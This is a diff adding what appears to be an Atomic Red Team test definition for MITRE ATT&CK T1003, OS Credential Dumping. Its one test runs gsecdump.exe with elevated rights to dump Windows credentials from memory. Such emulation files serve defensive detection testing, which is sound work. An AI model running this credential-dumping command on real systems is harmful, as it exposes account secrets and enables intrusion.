@@ -1,0 +1,20 @@
+attack_technique: T1003
+display_name: OS Credential Dumping
+atomic_tests:
+- name: Gsecdump
+  auto_generated_guid:
+  description: |
+    Dump credentials from memory using Gsecdump.
+  supported_platforms:
+  - windows
+  input_arguments:
+    gsecdump_exe:
+      description: Path to the Gsecdump executable
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe
+  executor:
+    command: |
+      "#{gsecdump_exe}" -a
+    name: command_prompt
+    elevation_required: true
+  dependency_executor_name:
